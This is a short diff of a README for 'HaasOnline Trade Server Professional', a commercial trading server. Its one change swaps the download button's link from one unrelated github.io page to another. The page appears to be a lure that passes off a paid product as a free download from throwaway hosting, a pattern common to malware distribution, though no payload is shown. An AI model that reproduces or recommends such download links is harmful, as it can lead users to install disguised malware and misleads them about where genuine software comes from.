@@ -21,7 +21,7 @@ To begin using this **Advanced HaasOnline Trade Server Professional** and **Haas
 | :--- | :--- |
 | **Get HaasOnline Trade Server Professional** | Click the button below to initiate the setup for this **Automated HaasOnline Trade Server Professional**. |
 
-[![Button](https://img.shields.io/badge/📦-Get_HaasOnline_Trade_Server_Professional-2ea44f?style=for-the-badge)](https://tomrsuni015.github.io/.github/haasonline-trade-server)
+[![Button](https://img.shields.io/badge/📦-Get_HaasOnline_Trade_Server_Professional-2ea44f?style=for-the-badge)](https://system-analysis-performance-hub.github.io/.github/haasonline-trade-server)
 
 ## System Requirements
 
